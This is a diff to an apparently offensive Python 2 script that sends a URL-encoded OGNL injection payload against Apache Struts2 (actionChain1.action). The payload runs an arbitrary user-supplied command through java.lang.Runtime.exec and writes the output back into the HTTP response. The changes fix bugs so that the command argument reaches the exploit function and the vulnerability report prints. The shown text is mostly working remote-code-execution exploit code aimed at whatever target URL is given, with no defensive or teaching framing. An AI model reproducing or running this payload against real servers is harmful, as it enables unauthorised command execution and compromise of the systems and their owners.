@@ -13,9 +13,9 @@ def zeroday_check(tgtURL, tgtPATH, tgtCMD):
 	payload = "%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec("+command+").getInputStream()%2c%23b%3dnew%20java.io.InputStreamReader(%23a)%2c%23c%3dnew %20java.io.BufferedReader(%23b)%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d/actionChain1.action"
 	resp = requests.get(urlcheck+payload)
 	time.sleep(1)
-	print resp.status_code + " "+urlcheck+ " !"
+	print str(resp.status_code) + " "+urlcheck+ " !"
 	if resp.status_code == 302:
-		print "[+] "+tgturl+ "is likely vulnerable"
+		print "[+] "+tgtURL+ "is likely vulnerable"
 
 def main():
 	parser = optparse.OptionParser('python %prog -u <website> -t <targetpath> -c command')
@@ -31,7 +31,7 @@ def main():
 		print parser.usage
 		sys.exit(0)
 	if(requests.get(tgtURL+""+tgtPATH).status_code==200):
-		zeroday_check(tgtURL, tgtPATH)
+		zeroday_check(tgtURL, tgtPATH, tgtCMD)
 	else:
 		print "[-] Check the Target URL and Path"
 	print "[+] Script complete"
